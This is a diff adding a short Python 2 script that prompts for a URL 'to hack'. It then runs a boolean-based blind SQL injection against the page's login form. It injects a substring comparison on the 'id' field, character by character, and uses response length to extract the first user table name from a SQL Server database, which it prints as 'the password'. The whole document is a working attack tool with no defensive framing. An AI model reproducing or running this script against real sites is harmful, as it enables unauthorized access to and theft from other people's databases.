@@ -1,0 +1,24 @@
+import urllib
+import urllib2
+
+passwordlist = []
+print "where url do you want to hack?"
+url = raw_input()
+
+for j in range(1, 50):
+    print j
+    for x in range(33, 127):
+        values = { 'id':"' OR lower(substring((SELECT min(name) FROM sysobjects WHERE xtype = 'U')," + str(j) + ",1)) = '" + chr(x) +"' --", 'pass':""}
+        params = urllib.urlencode(values)
+        request = urllib2.Request(url, params)
+        response = urllib2.urlopen(request)
+        the_page = response.read()
+        if len(the_page) > 2000:
+            passwordlist.append(chr(x))
+            password = "".join(passwordlist)
+            print password
+            break
+
+password = "".join(passwordlist)
+print ""
+print "The password is " + password
